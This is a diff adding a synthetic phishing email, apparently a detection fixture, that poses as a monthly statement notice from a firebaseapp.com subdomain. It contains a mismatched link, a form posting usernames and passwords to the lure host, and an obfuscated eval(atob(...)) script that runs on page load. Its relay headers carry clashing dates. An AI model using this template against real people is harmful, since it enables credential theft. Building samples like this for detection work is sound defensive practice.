@@ -1,0 +1,33 @@
+From: notice@firebase-auth.firebaseapp.com
+To: victim2@example.com
+Subject: Monthly statement available [ref U710952]
+Date: Tue, 14 Mar 2002 09:26:00 -0500
+Message-ID: <phish-242-afddff06-6150-4e9f-9eff-cb1c6c944a06@firebase-auth.firebaseapp.com>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 27 Mar 2002 11:18:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 02 Mar 2002 14:52:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 08 Mar 2002 18:51:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 07 Mar 2002 13:07:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 19 Mar 2002 15:23:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 07 Mar 2002 09:12:00 -0500
+Return-Path: <notice@firebase-auth.firebaseapp.com>
+Reply-To: notice@firebase-auth.firebaseapp.com
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=firebase-auth.firebaseapp.com; dkim=pass header.d=firebase-auth.firebaseapp.com; dmarc=pass header.from=firebase-auth.firebaseapp.com
+Received-SPF: pass (mx.example.com: domain of notice@firebase-auth.firebaseapp.com designates 192.0.2.22 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=firebase-auth.firebaseapp.com; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-242-30019c0f"
+
+--bnd-p-242-30019c0f
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://firebase-auth.firebaseapp.com/statement/U710952
+
+Reference: U710952
+--bnd-p-242-30019c0f
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://firebase-auth.firebaseapp.com/statement/U710952<br/><br/>Reference: U710952</p><p><a href="http://firebase-auth.firebaseapp.com/login">https://www.example.com/signin</a></p><form action="http://firebase-auth.firebaseapp.com/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-242-30019c0f--
